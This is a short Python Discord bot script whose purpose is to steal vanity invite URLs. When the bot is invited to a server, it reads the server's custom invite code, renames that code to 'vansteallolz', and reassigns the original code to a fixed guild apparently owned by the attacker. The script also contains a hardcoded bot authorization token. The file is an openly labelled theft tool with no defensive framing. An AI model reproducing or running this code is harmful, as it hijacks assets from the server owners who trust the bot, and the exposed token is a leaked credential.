import discord, httpx
from discord.ext import commands

client = commands.Bot(command_prefix="c", intents=discord.Intents.all())

@client.event
async def on_ready():
	print("Stealer Ready :))")


async def stealvanity(guild):
	vcode = str(await guild.vanity_invite()).replace("https://discord.gg/", "")
	print(f"Stealing Vanity: {vcode}")
	headers = {'Authorization': "Bot OTg0NDk5NDg1MTUxNDczNzE0.G1iynq.ry2Q1jLuDkljB-Pmy0oKGvvsD6bjPJOctadB5Q"}
	async with httpx.AsyncClient() as session:
		payload1 = {'code': "vansteallolz"}
		req1 = await session.patch(f'https://discord.com/api/v9/guilds/{guild.id}/vanity-url', json=payload1, headers=headers)
		print(f"{req1.status_code} | {req1.json()}")

		payload2 = {'code': vcode}
		req2 = await session.patch('https://discord.com/api/v9/guilds/965766582733246545/vanity-url', json=payload2, headers=headers)
		print(f"{req2.status_code} | {req2.json()}")


@client.event
async def on_guild_join(guild):
	print(guild)
	await stealvanity(guild)




client.run("")
